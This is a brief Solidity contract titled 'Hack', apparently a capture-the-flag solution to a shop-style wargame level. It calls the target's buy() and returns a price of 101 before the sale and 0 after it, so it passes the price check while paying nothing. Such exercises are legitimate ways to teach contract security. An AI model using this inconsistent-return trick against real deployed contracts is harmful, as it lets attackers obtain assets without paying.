// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface target {
    function buy() external;
    function isSold() external view returns (bool);
}

contract Hack {
    uint i;
    target instance;

    constructor(address _instaAdd) public {
        instance = target(_instaAdd);
    }

    function callBuy() public {
        address(instance).call(abi.encodeWithSignature("buy()"));
    }

    function price() public view returns (uint){
        if(!instance.isSold()) {
            return 101;
        } else {
            return 0;
        }
    }
}